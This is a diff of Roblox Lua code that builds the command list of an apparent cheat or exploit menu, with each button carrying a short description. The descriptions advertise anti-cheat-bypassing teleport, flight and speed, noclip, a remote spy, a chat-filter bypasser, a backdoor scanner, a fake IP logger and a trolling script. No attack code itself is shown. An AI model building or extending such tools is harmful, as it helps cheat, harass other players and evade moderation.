--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >loopmuteradio/<player name>
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >loopmuteradio/<player name>
 G2L["2f"] = Instance.new("TextButton", G2L["11"]);
 G2L["2f"]["TextWrapped"] = true;
 G2L["2f"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -493,13 +502,13 @@ G2L["2f"]["Name"] = [[ >loopmuteradio/<player name>]];
 G2L["2f"]["Text"] = [[ >loopmuteradio/<player name>]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >loopmuteradio/<player name>.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >loopmuteradio/<player name>.Info
 G2L["30"] = Instance.new("StringValue", G2L["2f"]);
 G2L["30"]["Name"] = [[Info]];
 G2L["30"]["Value"] = [[Command Info: Loop mutes someones boombox. (extra info once executed from output box)]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unloopmuteradio
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unloopmuteradio
 G2L["31"] = Instance.new("TextButton", G2L["11"]);
 G2L["31"]["TextWrapped"] = true;
 G2L["31"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -515,13 +524,13 @@ G2L["31"]["Name"] = [[ >unloopmuteradio]];
 G2L["31"]["Text"] = [[ >unloopmuteradio]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unloopmuteradio.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unloopmuteradio.Info
 G2L["32"] = Instance.new("StringValue", G2L["31"]);
 G2L["32"]["Name"] = [[Info]];
 G2L["32"]["Value"] = [[Command Info: Turns off Loop Mute for all the people who were affected.]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >glitchradio/<player name>
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >glitchradio/<player name>
 G2L["33"] = Instance.new("TextButton", G2L["11"]);
 G2L["33"]["TextWrapped"] = true;
 G2L["33"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -537,13 +546,13 @@ G2L["33"]["Name"] = [[ >glitchradio/<player name>]];
 G2L["33"]["Text"] = [[ >glitchradio/<player name>]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >glitchradio/<player name>.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >glitchradio/<player name>.Info
 G2L["34"] = Instance.new("StringValue", G2L["33"]);
 G2L["34"]["Name"] = [[Info]];
 G2L["34"]["Value"] = [[Command Info: Makes someones radio sound weird and glitchy. (extra info once executed in output box)]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >audiologs
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >audiologs
 G2L["35"] = Instance.new("TextButton", G2L["11"]);
 G2L["35"]["TextWrapped"] = true;
 G2L["35"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -559,13 +568,13 @@ G2L["35"]["Name"] = [[ >audiologs]];
 G2L["35"]["Text"] = [[ >audiologs]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >audiologs.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >audiologs.Info
 G2L["36"] = Instance.new("StringValue", G2L["35"]);
 G2L["36"]["Name"] = [[Info]];
 G2L["36"]["Value"] = [[Command Info: Executes an Audio Logger.]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >bdexe
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >bdexe
 G2L["37"] = Instance.new("TextButton", G2L["11"]);
 G2L["37"]["TextWrapped"] = true;
 G2L["37"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -581,13 +590,13 @@ G2L["37"]["Name"] = [[ >bdexe]];
 G2L["37"]["Text"] = [[ >bdexe]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >bdexe.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >bdexe.Info
 G2L["38"] = Instance.new("StringValue", G2L["37"]);
 G2L["38"]["Name"] = [[Info]];
 G2L["38"]["Value"] = [[Command Info: This doesnt execute no logs version anymore since pastebin deleted my account for no reason and now I have to give normal but the logs are removed by the devs so your fine. (they were game logs anyways)]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >frakturess
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >frakturess
 G2L["39"] = Instance.new("TextButton", G2L["11"]);
 G2L["39"]["TextWrapped"] = true;
 G2L["39"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -603,13 +612,13 @@ G2L["39"]["Name"] = [[ >frakturess]];
 G2L["39"]["Text"] = [[ >frakturess]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >frakturess.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >frakturess.Info
 G2L["3a"] = Instance.new("StringValue", G2L["39"]);
 G2L["3a"]["Name"] = [[Info]];
 G2L["3a"]["Value"] = [[Command Info: Executes Frakture SS. (backdoor scanner) (idk if this is discontinued honestly)]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatbot
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatbot
 G2L["3b"] = Instance.new("TextButton", G2L["11"]);
 G2L["3b"]["TextWrapped"] = true;
 G2L["3b"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -625,13 +634,13 @@ G2L["3b"]["Name"] = [[ >chatbot]];
 G2L["3b"]["Text"] = [[ >chatbot]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatbot.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatbot.Info
 G2L["3c"] = Instance.new("StringValue", G2L["3b"]);
 G2L["3c"]["Name"] = [[Info]];
 G2L["3c"]["Value"] = [[Command Info: Use a new Chat Bot thing so it works now.]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >antifling
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >antifling
 G2L["3d"] = Instance.new("TextButton", G2L["11"]);
 G2L["3d"]["TextWrapped"] = true;
 G2L["3d"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -647,13 +656,13 @@ G2L["3d"]["Name"] = [[ >antifling]];
 G2L["3d"]["Text"] = [[ >antifling]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >antifling.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >antifling.Info
 G2L["3e"] = Instance.new("StringValue", G2L["3d"]);
 G2L["3e"]["Name"] = [[Info]];
 G2L["3e"]["Value"] = [[Command Info: An actually good Anti Fling. I should probably make an command in it to end it so you can fling people or something]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >to/<player name>
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >to/<player name>
 G2L["3f"] = Instance.new("TextButton", G2L["11"]);
 G2L["3f"]["TextWrapped"] = true;
 G2L["3f"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -669,13 +678,13 @@ G2L["3f"]["Name"] = [[ >to/<player name>]];
 G2L["3f"]["Text"] = [[ >to/<player name>]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >to/<player name>.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >to/<player name>.Info
 G2L["40"] = Instance.new("StringValue", G2L["3f"]);
 G2L["40"]["Name"] = [[Info]];
 G2L["40"]["Value"] = [[Command Info: Teleports you to a player (in a way that bypasses most anti cheats)]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fly
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fly/<speed num>
 G2L["41"] = Instance.new("TextButton", G2L["11"]);
 G2L["41"]["TextWrapped"] = true;
 G2L["41"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -691,13 +700,13 @@ G2L["41"]["Name"] = [[ >fly/<speed num>]];
 G2L["41"]["Text"] = [[ >fly/<speed num>]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fly.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fly/<speed num>.Info
 G2L["42"] = Instance.new("StringValue", G2L["41"]);
 G2L["42"]["Name"] = [[Info]];
 G2L["42"]["Value"] = [[Command Info: Makes you fly in a way that bypasses most anti cheats with an optional speed argument.]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >noclip
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >noclip
 G2L["43"] = Instance.new("TextButton", G2L["11"]);
 G2L["43"]["TextWrapped"] = true;
 G2L["43"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -713,13 +722,13 @@ G2L["43"]["Name"] = [[ >noclip]];
 G2L["43"]["Text"] = [[ >noclip]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >noclip.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >noclip.Info
 G2L["44"] = Instance.new("StringValue", G2L["43"]);
 G2L["44"]["Name"] = [[Info]];
 G2L["44"]["Value"] = [[Command Info: Let's you walk through walls and stuff.]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >clip
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >clip
 G2L["45"] = Instance.new("TextButton", G2L["11"]);
 G2L["45"]["TextWrapped"] = true;
 G2L["45"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -735,13 +744,13 @@ G2L["45"]["Name"] = [[ >clip]];
 G2L["45"]["Text"] = [[ >clip]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >clip.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >clip.Info
 G2L["46"] = Instance.new("StringValue", G2L["45"]);
 G2L["46"]["Name"] = [[Info]];
 G2L["46"]["Value"] = [[Command Info: Turns off noclip.]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >speed/<number>
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >speed/<number>
 G2L["47"] = Instance.new("TextButton", G2L["11"]);
 G2L["47"]["TextWrapped"] = true;
 G2L["47"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -757,13 +766,13 @@ G2L["47"]["Name"] = [[ >speed/<number>]];
 G2L["47"]["Text"] = [[ >speed/<number>]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >speed/<number>.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >speed/<number>.Info
 G2L["48"] = Instance.new("StringValue", G2L["47"]);
 G2L["48"]["Name"] = [[Info]];
 G2L["48"]["Value"] = [[Command Info: Let's you walk fast in a way that bypasses most anti cheats.]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unspeed
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unspeed
 G2L["49"] = Instance.new("TextButton", G2L["11"]);
 G2L["49"]["TextWrapped"] = true;
 G2L["49"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -779,13 +788,13 @@ G2L["49"]["Name"] = [[ >unspeed]];
 G2L["49"]["Text"] = [[ >unspeed]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unspeed.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unspeed.Info
 G2L["4a"] = Instance.new("StringValue", G2L["49"]);
 G2L["4a"]["Name"] = [[Info]];
 G2L["4a"]["Value"] = [[Command Info: turns off speed (because it can't be stopped normally)]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >remotespy
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >remotespy
 G2L["4b"] = Instance.new("TextButton", G2L["11"]);
 G2L["4b"]["TextWrapped"] = true;
 G2L["4b"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -801,13 +810,13 @@ G2L["4b"]["Name"] = [[ >remotespy]];
 G2L["4b"]["Text"] = [[ >remotespy]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >remotespy.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >remotespy.Info
 G2L["4c"] = Instance.new("StringValue", G2L["4b"]);
 G2L["4c"]["Name"] = [[Info]];
 G2L["4c"]["Value"] = [[Command Info: Let's you see some remote event stuff]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatbypass
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatbypass
 G2L["4d"] = Instance.new("TextButton", G2L["11"]);
 G2L["4d"]["TextWrapped"] = true;
 G2L["4d"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -823,13 +832,13 @@ G2L["4d"]["Name"] = [[ >chatbypass]];
 G2L["4d"]["Text"] = [[ >chatbypass]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatbypass.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatbypass.Info
 G2L["4e"] = Instance.new("StringValue", G2L["4d"]);
 G2L["4e"]["Name"] = [[Info]];
 G2L["4e"]["Value"] = [[Command Info: Basically gives you the best most updated chat bypasser called BetterBypasser and also has a key system but it gives you options at least for how many steps which are how many hours of using]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >collisions
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >collisions
 G2L["4f"] = Instance.new("TextButton", G2L["11"]);
 G2L["4f"]["TextWrapped"] = true;
 G2L["4f"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -845,13 +854,13 @@ G2L["4f"]["Name"] = [[ >collisions]];
 G2L["4f"]["Text"] = [[ >collisions]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >collisions.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >collisions.Info
 G2L["50"] = Instance.new("StringValue", G2L["4f"]);
 G2L["50"]["Name"] = [[Info]];
 G2L["50"]["Value"] = [[Command Info: Makes you able to walk on people in non collision games. (Fling scripts don't work though.)]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>iplog
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >iplog
 G2L["51"] = Instance.new("TextButton", G2L["11"]);
 G2L["51"]["TextWrapped"] = true;
 G2L["51"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -864,16 +873,16 @@ G2L["51"]["ZIndex"] = 2147483647;
 G2L["51"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
 G2L["51"]["BackgroundTransparency"] = 1;
 G2L["51"]["Name"] = [[ >iplog]];
-G2L["51"]["Text"] = [[ >iplog]];
+G2L["51"]["Text"] = [[>iplog]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>iplog.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >iplog.Info
 G2L["52"] = Instance.new("StringValue", G2L["51"]);
 G2L["52"]["Name"] = [[Info]];
 G2L["52"]["Value"] = [[Command Info: Gives you a fake ip logger gui i edited to hopefully fix the problems of it tagging]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >brookhaven
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >brookhaven
 G2L["53"] = Instance.new("TextButton", G2L["11"]);
 G2L["53"]["TextWrapped"] = true;
 G2L["53"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -889,13 +898,13 @@ G2L["53"]["Name"] = [[ >brookhaven]];
 G2L["53"]["Text"] = [[ >brookhaven]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >brookhaven.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >brookhaven.Info
 G2L["54"] = Instance.new("StringValue", G2L["53"]);
 G2L["54"]["Name"] = [[Info]];
 G2L["54"]["Value"] = [[Command Info: Brookhaven trolling script.]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>animlogs
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >animlogs
 G2L["55"] = Instance.new("TextButton", G2L["11"]);
 G2L["55"]["TextWrapped"] = true;
 G2L["55"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -908,16 +917,16 @@ G2L["55"]["ZIndex"] = 2147483647;
 G2L["55"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
 G2L["55"]["BackgroundTransparency"] = 1;
 G2L["55"]["Name"] = [[ >animlogs]];
-G2L["55"]["Text"] = [[ >animlogs]];
+G2L["55"]["Text"] = [[>animlogs]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>animlogs.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >animlogs.Info
 G2L["56"] = Instance.new("StringValue", G2L["55"]);
 G2L["56"]["Name"] = [[Info]];
 G2L["56"]["Value"] = [[Command Info: Gives you a cool looking gui thyat has stuff like logging animations, playing animations, pause animations, move through every sequence, and previewing them]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >emojichat
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >emojichat
 G2L["57"] = Instance.new("TextButton", G2L["11"]);
 G2L["57"]["TextWrapped"] = true;
 G2L["57"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -933,13 +942,13 @@ G2L["57"]["Name"] = [[ >emojichat]];
 G2L["57"]["Text"] = [[ >emojichat]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >emojichat.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >emojichat.Info
 G2L["58"] = Instance.new("StringValue", G2L["57"]);
 G2L["58"]["Name"] = [[Info]];
 G2L["58"]["Value"] = [[Command Info: Let's you do emojis in chat using : (new chat has this feature but this is for legacy chat)]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >vghub
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >vghub
 G2L["59"] = Instance.new("TextButton", G2L["11"]);
 G2L["59"]["TextWrapped"] = true;
 G2L["59"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -955,13 +964,13 @@ G2L["59"]["Name"] = [[ >vghub]];
 G2L["59"]["Text"] = [[ >vghub]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >vghub.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >vghub.Info
 G2L["5a"] = Instance.new("StringValue", G2L["59"]);
 G2L["5a"]["Name"] = [[Info]];
 G2L["5a"]["Value"] = [[Command Info: A script hub with a lot of games.]];
 
 
